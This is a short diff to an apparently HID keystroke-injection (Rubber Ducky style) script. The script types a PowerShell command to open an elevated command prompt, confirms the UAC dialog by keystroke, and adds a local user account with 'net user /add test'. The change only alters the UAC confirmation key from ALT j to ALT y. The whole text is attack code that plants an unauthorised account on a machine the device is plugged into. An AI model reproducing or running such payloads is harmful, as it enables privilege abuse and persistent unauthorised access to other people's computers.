@@ -5,7 +5,7 @@ STRING powershell Start-Process cmd -Verb runAs
 DELAY 100
 ENTER
 DELAY 1000
-ALT j
+ALT y
 DELAY 2000
 STRING net user /add test
 DELAY 100
